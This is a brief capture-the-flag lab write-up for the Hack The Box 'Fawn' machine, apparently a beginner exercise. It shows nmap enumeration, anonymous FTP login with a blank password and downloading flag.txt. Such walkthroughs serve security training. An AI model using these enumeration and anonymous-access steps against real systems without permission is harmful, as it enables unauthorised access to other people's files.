# Hack The Box – Fawn

## Objective
Learn how to enumerate FTP services and access files using anonymous login.

## Tools Used
- nmap
- ftp
- Linux terminal

## Enumeration

Scan the target:

nmap -sC -sV <target-ip>

Result:

21/tcp open ftp vsftpd 3.0.3

Anonymous FTP login allowed.

## Exploitation

Connect to FTP:

ftp <target-ip>

Login credentials:

Username: anonymous  
Password: (blank)

List files:

ls

File discovered:

flag.txt

Download file:

get flag.txt

Read locally:

cat flag.txt

## Skills Learned
- FTP enumeration
- Anonymous login vulnerability
- File retrieval from remote services
